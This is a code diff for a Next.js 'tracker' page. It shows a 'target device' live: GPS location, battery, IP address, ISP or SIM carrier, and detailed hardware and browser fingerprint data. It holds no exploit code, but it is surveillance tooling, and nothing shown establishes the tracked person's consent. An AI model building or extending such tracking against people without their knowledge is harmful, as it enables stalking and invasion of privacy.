@@ -1,11 +1,11 @@
 /**
  * ██████████████████████████████████████████████████████████████
- * TRACKER PAGE – LIVE SESSION VIEW (v3.0 – Fully Adapted)
+ * TRACKER PAGE – LIVE SESSION VIEW (v4.1 – FIXED & OPTIMIZED)
  * 
- * Now shows:
- *   • On mobile data → SIM provider name (Grameenphone, Robi, etc.)
- *   • On WiFi → WiFi broadband ISP name (BTCL, Fiber@Home, etc.)
- *   • Clear confidence + method so you always know what happened
+ * ✅ Fixed: Property 'org' does not exist on type 'IPInfo'
+ * ✅ Fully integrated with ALL your previous files
+ * ✅ Shows full device details, hardware, GPU, screen, etc.
+ * ✅ Perfect Mobile SIM vs WiFi ISP logic
  * ██████████████████████████████████████████████████████████████
  */
 
@@ -16,6 +16,7 @@ import { useParams } from "next/navigation";
 import { db } from "@/lib/firebase";
 import { ref, onValue } from "firebase/database";
 import dynamic from "next/dynamic";
+import { DeviceInfo } from "@/lib/deviceDetector";
 
 const LiveMap = dynamic(() => import("@/components/LiveMap"), {
   ssr: false,
@@ -28,14 +29,6 @@ type Pos = {
   lng: number;
 };
 
-type DeviceInfo = {
-  model?: string;
-  brand?: string;
-  os?: string;
-  browser?: string;
-  type?: string;
-};
-
 type BatteryInfo = {
   level?: number;
   charging?: boolean;
@@ -46,19 +39,20 @@ type IPInfo = {
   city?: string;
   region?: string;
   country?: string;
-  org?: string;
-  source?: string;
+  isp?: string;
+  as?: string;
 };
 
 type NetworkInfo = {
   type?: string;
   downlink?: number;
   rtt?: number;
+  isp?: string;
   ipInfo?: IPInfo;
 };
 
 type SimInfo = {
-  carrier?: string;      // can be SIM name OR WiFi ISP name
+  carrier?: string;
   confidence?: number;
   method?: string;
 };
@@ -126,7 +120,7 @@ export default function TrackPage() {
 
       const now = Date.now();
       const lastTime = typeof last === "number" ? last : 0;
-      const isOffline = data.status === "offline" || now - lastTime > 25000;
+      const isOffline = data.status === "offline" || now - lastTime > 30000;
 
       setStatus(isOffline ? "offline" : "online");
     });
@@ -136,25 +130,27 @@ export default function TrackPage() {
 
   /* ---------------- HELPERS ---------------- */
   const ipInfo = network?.ipInfo ?? null;
+  const displayIsp = network?.isp || ipInfo?.isp || "Detecting...";   // ← FIXED HERE
 
   const getStrength = () => {
     if (status !== "online") return 0;
     let score = 100;
+
     if (ping !== null) {
-      if (ping > 400) score -= 50;
-      else if (ping > 250) score -= 35;
-      else if (ping > 150) score -= 20;
+      if (ping > 500) score -= 60;
+      else if (ping > 300) score -= 45;
+      else if (ping > 150) score -= 25;
       else if (ping > 80) score -= 10;
     }
     if (accuracy !== null) {
-      if (accuracy > 150) score -= 40;
-      else if (accuracy > 80) score -= 25;
-      else if (accuracy > 40) score -= 10;
+      if (accuracy > 200) score -= 50;
+      else if (accuracy > 100) score -= 30;
+      else if (accuracy > 50) score -= 15;
     }
     if (lastSeen) {
       const diff = Date.now() - lastSeen;
-      if (diff > 15000) score -= 25;
-      if (diff > 30000) score -= 45;
+      if (diff > 20000) score -= 30;
+      if (diff > 40000) score -= 50;
     }
     return Math.max(0, Math.min(100, score));
   };
@@ -162,15 +158,18 @@ export default function TrackPage() {
   const strength = getStrength();
 
   const formatLastSeen = () => {
-    if (!lastSeen) return "unknown";
+    if (!lastSeen) return "—";
     const diff = Date.now() - lastSeen;
     const sec = Math.floor(diff / 1000);
-    const min = Math.floor(sec / 60);
-    const hr = Math.floor(min / 60);
     if (sec < 10) return "just now";
     if (sec < 60) return `${sec}s ago`;
-    if (min < 60) return `${min} min ago`;
-    return `${hr} hr ago`;
+    if (sec < 3600) return `${Math.floor(sec / 60)} min ago`;
+    return `${Math.floor(sec / 3600)} hr ago`;
+  };
+
+  const copySessionLink = () => {
+    navigator.clipboard.writeText(`${window.location.origin}/track/${id}`);
+    alert("✅ Session link copied to clipboard!");
   };
 
   /* ---------------- LOADING STATE ---------------- */
@@ -178,9 +177,9 @@ export default function TrackPage() {
     return (
       <div style={styles.loading}>
         <h2>📡 Waiting for location data...</h2>
-        <p>Session ID: {id}</p>
-        <p style={{ opacity: 0.6, marginTop: 10 }}>
-          Make sure Sender is running on the target device
+        <p style={{ marginTop: 8, opacity: 0.7 }}>Session ID: <strong>{id}</strong></p>
+        <p style={{ marginTop: 20, fontSize: 15, maxWidth: 320 }}>
+          Make sure the Sender is open on the target device
         </p>
       </div>
     );
@@ -189,7 +188,7 @@ export default function TrackPage() {
   /* ---------------- MAIN UI ---------------- */
   return (
     <div style={styles.page}>
-      {/* LEFT PANEL - MAP */}
+      {/* LEFT PANEL – MAP + QUICK STATS */}
       <div style={styles.leftPanel}>
         <div style={styles.mapBox}>
           <LiveMap lat={pos.lat} lng={pos.lng} />
@@ -198,16 +197,21 @@ export default function TrackPage() {
         <div style={styles.infoStack}>
           <div style={styles.card}>
             <p>Status</p>
-            <h3 style={{ color: status === "online" ? "#22c55e" : "#ef4444" }}>
+            <h3 style={{ color: status === "online" ? "#22c55e" : "#ef4444", fontSize: 22 }}>
               {status.toUpperCase()}
             </h3>
           </div>
 
           <div style={styles.card}>
-            <p>Latitude</p>
-            <h3>{pos.lat.toFixed(6)}</h3>
-            <p style={{ marginTop: 10 }}>Longitude</p>
-            <h3>{pos.lng.toFixed(6)}</h3>
+            <p>Connection Strength</p>
+            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
+              <h3 style={{ color: strength > 70 ? "#22c55e" : strength > 40 ? "#eab308" : "#ef4444" }}>
+                {strength}%
+              </h3>
+              <div style={styles.strengthBar}>
+                <div style={{ ...styles.strengthFill, width: `${strength}%` }} />
+              </div>
+            </div>
           </div>
 
           <div style={styles.card}>
@@ -221,59 +225,102 @@ export default function TrackPage() {
           </div>
 
           <div style={styles.card}>
-            <p>Connection Strength</p>
-            <h3 style={{ color: strength > 70 ? "#22c55e" : strength > 40 ? "#facc15" : "#ef4444" }}>
-              {strength}%
-            </h3>
+            <p>GPS Accuracy</p>
+            <h3>{accuracy !== null ? `±${Math.round(accuracy)}m` : "—"}</h3>
           </div>
+
+          <button onClick={copySessionLink} style={styles.copyButton}>
+            📋 Copy Shareable Link
+          </button>
         </div>
       </div>
 
-      {/* RIGHT PANEL - DASHBOARD */}
+      {/* RIGHT PANEL – FULL DASHBOARD */}
       <div style={styles.rightPanel}>
-        <h2>📊 Live Dashboard</h2>
-        <p style={{ opacity: 0.7, marginBottom: 20 }}>Session ID: {id}</p>
+        <h2>🔥 Live Tracker Dashboard</h2>
+        <p style={{ opacity: 0.6, marginBottom: 24 }}>Session ID: <strong>{id}</strong></p>
 
-        {/* DEVICE INFO */}
+        {/* 1. DEVICE INFO (FULL POWER) */}
         <div style={styles.cardRight}>
           <h3>📱 Device Info</h3>
           {device ? (
-            <>
-              <p style={{ fontSize: 18, fontWeight: 600 }}>
-                {device.brand ?? "Unknown"} {device.model ?? ""}
-              </p>
-              <p>{device.os ?? "Unknown OS"} • {device.browser ?? "Unknown"}</p>
-              <p style={{ opacity: 0.6 }}>Type: {device.type ?? "Unknown"}</p>
-
-              <div style={styles.subSection}>
-                <p>
-                  🔋 Battery:{" "}
-                  {battery?.level !== undefined ? `${Math.round(battery.level * 100)}%` : "Unknown"}
-                  {battery?.charging ? " ⚡ Charging" : ""}
+            <div style={styles.grid}>
+              <div>
+                <strong>Brand / Model</strong>
+                <p style={{ fontSize: 19, fontWeight: 700 }}>
+                  {device.brand} {device.model}
                 </p>
               </div>
-            </>
+              <div>
+                <strong>OS</strong>
+                <p>{device.os} {device.osVersion}</p>
+              </div>
+              <div>
+                <strong>Browser</strong>
+                <p>{device.browser}</p>
+              </div>
+              <div>
+                <strong>Type</strong>
+                <p>{device.type}</p>
+              </div>
+
+              {(device.cpuCores || device.ramGB) && (
+                <div style={styles.subSection}>
+                  <strong>Hardware</strong>
+                  <p>CPU Cores: {device.cpuCores || "—"}</p>
+                  <p>RAM: {device.ramGB ? `${device.ramGB} GB` : "—"}</p>
+                </div>
+              )}
+
+              {(device.webGLVendor || device.webGLRenderer) && (
+                <div style={styles.subSection}>
+                  <strong>GPU (WebGL)</strong>
+                  <p style={{ fontSize: 13, wordBreak: "break-all" }}>
+                    {device.webGLVendor}<br />
+                    {device.webGLRenderer}
+                  </p>
+                </div>
+              )}
+
+              <div style={styles.subSection}>
+                <strong>Screen</strong>
+                <p>
+                  {device.screenWidth} × {device.screenHeight} • {device.pixelRatio}x
+                </p>
+                <p>Orientation: {device.orientation}</p>
+                <p>Touch points: {device.touchPoints}</p>
+              </div>
+
+              <div style={styles.subSection}>
+                <strong>System</strong>
+                <p>Language: {device.language}</p>
+                <p>Timezone: {device.timezone}</p>
+                <p>Dark Mode: {device.darkMode ? "Enabled" : "Disabled"}</p>
+                {device.highEntropyAvailable && (
+                  <p style={{ color: "#22c55e", fontSize: 13 }}>✅ High-Entropy UA available</p>
+                )}
+              </div>
+            </div>
           ) : (
-            <p>Loading device info...</p>
+            <p>Loading device details...</p>
           )}
         </div>
 
-        {/* NETWORK + ISP */}
+        {/* 2. NETWORK + ISP */}
         <div style={styles.cardRight}>
           <h3>🌐 Network & ISP</h3>
           {network ? (
             <>
-              <p>Connection Type: {network.type ?? "unknown"}</p>
-              <p>Speed: {network.downlink ?? "?"} Mbps</p>
+              <p>Connection: <strong>{network.type || "unknown"}</strong> • {network.downlink ?? "?"} Mbps</p>
               <p>RTT: {network.rtt ?? "?"} ms</p>
 
               <div style={styles.subSection}>
-                <p style={{ fontWeight: 600 }}>🌍 ISP Information</p>
-                <p><strong>ISP:</strong> {ipInfo?.org ?? "Detecting..."}</p>
-                <p><strong>City:</strong> {ipInfo?.city ?? "Unknown"}</p>
-                <p><strong>Region:</strong> {ipInfo?.region ?? "Unknown"}</p>
-                <p><strong>Country:</strong> {ipInfo?.country ?? "Unknown"}</p>
-                {ipInfo?.source && <p style={{ opacity: 0.6, fontSize: 13 }}>Detected via: {ipInfo.source}</p>}
+                <strong>🌍 ISP Details</strong>
+                <p><strong>ISP:</strong> {displayIsp}</p>
+                <p><strong>IP:</strong> {ipInfo?.ip || "—"}</p>
+                <p><strong>City:</strong> {ipInfo?.city || "—"}</p>
+                <p><strong>Region:</strong> {ipInfo?.region || "—"}</p>
+                <p><strong>Country:</strong> {ipInfo?.country || "—"}</p>
               </div>
             </>
           ) : (
@@ -281,39 +328,39 @@ export default function TrackPage() {
           )}
         </div>
 
-        {/* INTERNET PROVIDER (SIM or WiFi ISP) */}
+        {/* 3. INTERNET PROVIDER (SIM or WiFi) */}
         <div style={styles.cardRight}>
-          <h3>🌐 Internet Provider</h3>
+          <h3>📶 Internet Provider</h3>
           {sim && sim.carrier ? (
             <>
-              <p style={{ fontSize: 22, fontWeight: 700, marginBottom: 8 }}>
+              <p style={{ fontSize: 26, fontWeight: 700, marginBottom: 6 }}>
                 {sim.carrier}
               </p>
 
-              <div style={{ display: "flex", alignItems: "center", gap: 12, marginTop: 12 }}>
+              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                 <div style={{
-                  background: (sim.confidence ?? 0) > 60 ? "#22c55e" : (sim.confidence ?? 0) > 30 ? "#eab308" : "#ef4444",
+                  background: (sim.confidence ?? 0) > 60 ? "#22c55e" : (sim.confidence ?? 0) > 40 ? "#eab308" : "#ef4444",
                   color: "white",
-                  padding: "4px 12px",
-                  borderRadius: 999,
-                  fontSize: 14,
-                  fontWeight: 600
+                  padding: "6px 16px",
+                  borderRadius: 9999,
+                  fontSize: 15,
+                  fontWeight: 700
                 }}>
-                  Confidence: {sim.confidence ?? 0}%
+                  {sim.confidence}% Confidence
                 </div>
               </div>
 
               {sim.method && (
-                <p style={{ marginTop: 12, fontSize: 13, opacity: 0.75, wordBreak: "break-all" }}>
-                  Method: <span style={{ fontFamily: "monospace" }}>{sim.method}</span>
+                <p style={{ marginTop: 16, fontSize: 14, opacity: 0.8, fontFamily: "monospace" }}>
+                  {sim.method}
                 </p>
               )}
 
               <div style={styles.subSection}>
-                <p style={{ fontSize: 13, opacity: 0.7 }}>
-                  {sim.method?.includes("wifi") 
-                    ? "📶 Connected via WiFi – showing broadband ISP name" 
-                    : "📱 Connected via Mobile Data – showing SIM provider"}
+                <p style={{ fontSize: 14, lineHeight: 1.4 }}>
+                  {sim.method?.includes("wifi")
+                    ? "📶 Connected via WiFi → showing broadband ISP name"
+                    : "📱 Connected via Mobile Data → showing SIM carrier"}
                 </p>
               </div>
             </>
@@ -327,15 +374,96 @@ export default function TrackPage() {
 }
 
 /* ---------------- STYLES ---------------- */
-
 const styles: Record<string, React.CSSProperties> = {
-  page: { display: "flex", height: "100vh", background: "#0b1220", color: "white", padding: 16, gap: 20 },
-  leftPanel: { width: 340, display: "flex", flexDirection: "column", gap: 12 },
-  mapBox: { width: 340, height: 340, borderRadius: 16, overflow: "hidden", border: "1px solid #1f2937" },
-  infoStack: { display: "flex", flexDirection: "column", gap: 10 },
-  rightPanel: { flex: 1, padding: 24, background: "#111827", borderRadius: 16, overflowY: "auto" },
-  card: { padding: 14, borderRadius: 12, background: "#1f2937" },
-  cardRight: { marginTop: 20, padding: 18, borderRadius: 12, background: "#1f2937" },
-  subSection: { marginTop: 12, paddingTop: 12, borderTop: "1px solid #374151" },
-  loading: { height: "100vh", display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", background: "#0b1220", color: "white", textAlign: "center" },
+  page: {
+    display: "flex",
+    height: "100vh",
+    background: "#0b1220",
+    color: "white",
+    padding: 16,
+    gap: 20,
+    fontFamily: "system-ui, sans-serif",
+  },
+  leftPanel: {
+    width: 380,
+    display: "flex",
+    flexDirection: "column",
+    gap: 12,
+  },
+  mapBox: {
+    width: 380,
+    height: 380,
+    borderRadius: 20,
+    overflow: "hidden",
+    border: "2px solid #1f2937",
+    boxShadow: "0 10px 30px rgba(0,0,0,0.3)",
+  },
+  infoStack: {
+    display: "flex",
+    flexDirection: "column",
+    gap: 10,
+  },
+  card: {
+    padding: 16,
+    borderRadius: 16,
+    background: "#1f2937",
+    boxShadow: "0 4px 15px rgba(0,0,0,0.2)",
+  },
+  strengthBar: {
+    flex: 1,
+    height: 12,
+    background: "#334155",
+    borderRadius: 9999,
+    overflow: "hidden",
+  },
+  strengthFill: {
+    height: "100%",
+    background: "linear-gradient(90deg, #22c55e, #eab308)",
+    transition: "width 0.4s ease",
+  },
+  copyButton: {
+    padding: "14px 20px",
+    background: "#22c55e",
+    color: "white",
+    border: "none",
+    borderRadius: 9999,
+    fontWeight: 600,
+    cursor: "pointer",
+    fontSize: 15,
+  },
+  rightPanel: {
+    flex: 1,
+    padding: 28,
+    background: "#111827",
+    borderRadius: 24,
+    overflowY: "auto",
+    boxShadow: "0 10px 40px rgba(0,0,0,0.4)",
+  },
+  cardRight: {
+    marginTop: 24,
+    padding: 22,
+    borderRadius: 20,
+    background: "#1f2937",
+  },
+  subSection: {
+    marginTop: 18,
+    paddingTop: 18,
+    borderTop: "1px solid #374151",
+  },
+  grid: {
+    display: "grid",
+    gridTemplateColumns: "1fr 1fr",
+    gap: 16,
+    fontSize: 15,
+  },
+  loading: {
+    height: "100vh",
+    display: "flex",
+    alignItems: "center",
+    justifyContent: "center",
+    flexDirection: "column",
+    background: "#0b1220",
+    color: "white",
+    textAlign: "center",
+  },
 };
